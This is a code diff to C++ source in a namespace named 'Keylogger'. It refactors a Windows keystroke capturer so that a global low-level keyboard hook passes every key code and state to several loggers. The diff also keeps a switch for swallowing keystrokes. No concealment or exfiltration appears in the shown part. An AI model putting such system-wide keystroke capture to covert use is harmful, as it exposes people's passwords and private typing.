@@ -2,8 +2,8 @@
 
 namespace Keylogger {
 
+std::vector<ILogger*> KeystrokeCapturerWindows::_loggers;
 bool KeystrokeCapturerWindows::_consumeKeystrokes = false;
-ILogger* KeystrokeCapturerWindows::_logger = nullptr;
 
 bool KeystrokeCapturerWindows::start() {
     _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
@@ -18,8 +18,8 @@ void KeystrokeCapturerWindows::consumeKeystrokes(bool consume) {
     _consumeKeystrokes = consume;
 }
 
-void KeystrokeCapturerWindows::setLogger(ILogger* logger) {
-    _logger = logger;
+void KeystrokeCapturerWindows::addLogger(ILogger* logger) {
+    _loggers.push_back(logger);
 }
 
 LRESULT CALLBACK KeystrokeCapturerWindows::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -32,7 +32,9 @@ LRESULT CALLBACK KeystrokeCapturerWindows::LowLevelKeyboardProc(int nCode, WPARA
                 PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
                 int state = wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN;
 
-                _logger->logKeycode(p->vkCode, state);
+                for (ILogger* logger : _loggers) {
+                    logger->logKeycode(p->vkCode, state);
+                }
 
                 // keybd_event('B', 0, 0, 0);
                 // keybd_event('B', 0, KEYEVENTF_KEYUP, 0);
